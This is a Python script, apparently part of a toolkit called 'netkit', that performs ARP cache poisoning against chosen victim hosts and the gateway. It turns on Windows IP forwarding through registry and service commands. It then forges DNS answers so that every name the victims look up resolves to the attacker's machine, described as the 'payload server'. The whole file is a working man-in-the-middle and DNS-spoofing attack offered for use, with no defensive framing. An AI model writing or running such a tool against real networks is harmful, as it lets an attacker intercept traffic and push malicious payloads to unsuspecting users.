# netkit/redirect.py — ARP poison + DNS spoof toward the payload server.
# Needs: admin shell + Npcap + scapy. Ctrl+C restores ARP tables.
import argparse
import threading
import time

from scapy.all import (
    ARP,
    DNS,
    DNSQR,
    DNSRR,
    Ether,
    IP,
    UDP,
    conf,
    get_if_addr,
    get_if_hwaddr,
    getmacbyip,
    sendp,
    sniff,
)


def resolve(iface, ip):
    mac = getmacbyip(ip)
    if not mac:
        raise SystemExit("[-] no MAC for %s (host down?)" % ip)
    return mac


def poison_loop(iface, my_mac, pairs, stop):
    """pairs: list of (target_ip, target_mac, gateway_ip, gateway_mac)."""
    while not stop.is_set():
        for tip, tmac, gip, gmac in pairs:
            sendp(
                Ether(dst=tmac)
                / ARP(op=2, psrc=gip, hwsrc=my_mac, pdst=tip, hwdst=tmac),
                iface=iface,
                verbose=0,
            )
            sendp(
                Ether(dst=gmac)
                / ARP(op=2, psrc=tip, hwsrc=my_mac, pdst=gip, hwdst=gmac),
                iface=iface,
                verbose=0,
            )
        stop.wait(1.5)


def restore(iface, pairs):
    for tip, tmac, gip, gmac in pairs:
        sendp(
            Ether(dst=tmac) / ARP(op=2, psrc=gip, hwsrc=gmac, pdst=tip, hwdst=tmac),
            iface=iface,
            verbose=0,
        )
        sendp(
            Ether(dst=gmac) / ARP(op=2, psrc=tip, hwsrc=tmac, pdst=gip, hwdst=gmac),
            iface=iface,
            verbose=0,
        )


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", required=True, help="victim IPs, comma separated")
    ap.add_argument("--gateway", default="", help="gateway IP (auto if empty)")
    ap.add_argument("--iface", default=conf.iface)
    ap.add_argument("--forward", action="store_true", help="try enabling OS IP forwarding")
    args = ap.parse_args()

    iface = args.iface
    my_ip = get_if_addr(iface)
    my_mac = get_if_hwaddr(iface)
    gw_ip = args.gateway or conf.route.route("0.0.0.0")[2]
    gw_mac = resolve(iface, gw_ip)

    pairs = []
    for tip in [t.strip() for t in args.target.split(",") if t.strip()]:
        pairs.append((tip, resolve(iface, tip), gw_ip, gw_mac))
        print("[*] target %s  gateway %s via %s" % (tip, gw_ip, iface))

    if args.forward:
        import subprocess

        subprocess.run(
            'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters"'
            " /v IPEnableRouter /t REG_DWORD /d 1 /f",
            shell=True,
        )
        subprocess.run("sc config RemoteAccess start= auto", shell=True)
        subprocess.run("sc start RemoteAccess", shell=True)
        print("[*] IP forwarding requested (reboot if it refuses to start)")

    print("[*] spoofing DNS -> %s ; payload server must listen on port 80" % my_ip)
    stop = threading.Event()
    threading.Thread(
        target=poison_loop, args=(iface, my_mac, pairs, stop), daemon=True
    ).start()

    flt = "udp port 53 and (" + " or ".join(
        "src host %s" % p[0] for p in pairs
    ) + ")"

    def answer(pkt):
        if DNS not in pkt or pkt[DNS].qr != 0 or DNSQR not in pkt:
            return
        q = pkt[DNSQR]
        resp = (
            Ether(dst=pkt[Ether].src)
            / IP(src=pkt[IP].dst, dst=pkt[IP].src)
            / UDP(sport=53, dport=pkt[UDP].sport)
            / DNS(
                id=pkt[DNS].id,
                qr=1,
                aa=1,
                rd=1,
                ra=1,
                qd=pkt[DNS].qd,
                an=DNSRR(rrname=q.qname, type="A", ttl=30, rdata=my_ip),
            )
        )
        sendp(resp, iface=iface, verbose=0)
        try:
            print("[dns] %s -> %s" % (q.qname.decode(errors="replace"), my_ip))
        except Exception:
            pass

    try:
        while not stop.is_set():
            sniff(
                iface=iface,
                filter=flt,
                prn=answer,
                store=0,
                timeout=2,
            )
    except KeyboardInterrupt:
        pass
    finally:
        stop.set()
        print("[*] restoring ARP...")
        restore(iface, pairs)
        time.sleep(0.5)


if __name__ == "__main__":
    main()
